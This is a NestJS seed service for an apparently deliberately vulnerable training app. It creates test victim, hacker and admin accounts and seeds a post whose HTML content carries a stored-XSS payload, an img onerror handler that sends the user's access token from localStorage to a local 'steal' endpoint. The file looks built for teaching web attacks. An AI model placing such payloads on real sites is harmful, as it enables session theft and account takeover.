import { Injectable, OnModuleInit, Logger } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import * as bcrypt from 'bcrypt';
import { User, Role } from '../entities/user.entity';
import { Post } from '../entities/post.entity';

@Injectable()
export class SeedService implements OnModuleInit {
  private readonly logger = new Logger(SeedService.name);

  constructor(
    @InjectRepository(User) private readonly userRepo: Repository<User>,
    @InjectRepository(Post) private readonly postRepo: Repository<Post>,
  ) {}

  async onModuleInit() {
    const count = await this.userRepo.count();
    if (count > 0) {
      this.logger.log('Seed data already exists — skipping.');
      return;
    }
    await this.seed();
  }

  private async seed() {
    this.logger.log('Seeding initial data...');

    // ── 사용자 생성 ───────────────────────────────────────────
    const [victim, hacker, admin] = await this.userRepo.save([
      {
        email: 'victim@test.com',
        password: await bcrypt.hash('victim1234', 10),
        points: 1_000_000,
        role: Role.USER,
      },
      {
        email: 'hacker@test.com',
        password: await bcrypt.hash('hacker1234', 10),
        points: 0,
        role: Role.USER,
      },
      {
        email: 'admin@test.com',
        password: await bcrypt.hash('admin1234', 10),
        points: 0,
        role: Role.ADMIN,
      },
    ]);

    // ── 게시글 생성 (XSS 페이로드 포함) ──────────────────────
    // ❌ V1 XSS 공격용: hacker가 작성한 악성 게시글
    await this.postRepo.save({
      title: '초특가 세일! 오늘만 50% 할인!',
      content:
        '<p>지금 바로 확인하세요!</p>\n' +
        '<img src=x onerror="fetch(\'http://localhost:4999/steal?t=\'+localStorage.getItem(\'at\'))">',
      authorId: hacker.id,
    });

    await this.postRepo.save({
      title: '일반 공지사항',
      content: '<p>안녕하세요. 서비스 점검 안내드립니다.</p>',
      authorId: admin.id,
    });

    await this.postRepo.save({
      title: '회원 여러분께 드리는 혜택',
      content: '<p>포인트 적립 이벤트가 시작되었습니다. 많은 참여 부탁드립니다!</p>',
      authorId: victim.id,
    });

    this.logger.log('✅ Seed complete');
    this.logger.log('  victim@test.com  / victim1234 / 1,000,000 pts');
    this.logger.log('  hacker@test.com  / hacker1234 / 0 pts');
    this.logger.log('  admin@test.com   / admin1234  / 0 pts');
  }
}
